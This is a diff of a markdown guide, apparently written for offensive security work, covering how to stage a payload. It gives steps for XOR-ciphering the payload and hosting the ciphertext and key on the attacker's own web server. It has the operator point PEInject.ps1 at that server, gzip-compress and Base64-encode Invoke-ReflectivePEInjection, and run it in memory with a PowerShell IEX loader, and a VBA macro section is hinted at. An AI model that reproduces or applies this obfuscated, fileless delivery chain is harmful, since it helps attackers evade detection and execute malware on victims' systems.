@@ -37,16 +37,20 @@ write-host "[*] $file1 XOR $file2`n[*] Saved to " -nonewline;
 Write-host "$out" -foregroundcolor yellow -nonewline; Write-host ".";
 ```
 
+Then host the ciphered text and the key on your own web server.
+
+Then use the PEInject.ps1 script and replace the URLs with your own web server.
+
 # Compress
+
+Then compress using https://www.multiutil.com/text-to-gzip-compress/ and put the output into the below script.
 
 ```
 $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('insert_gzip_compressed_Invoke-ReflectivePEInjection'));
 IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()
 ```
 
-# References
-- https://www.multiutil.com/text-to-gzip-compress/
-- https://www.base64encode.org/
+Then Base64 the above script using https://www.base64encode.org/ .
 
 ## Macro Code VBA
 
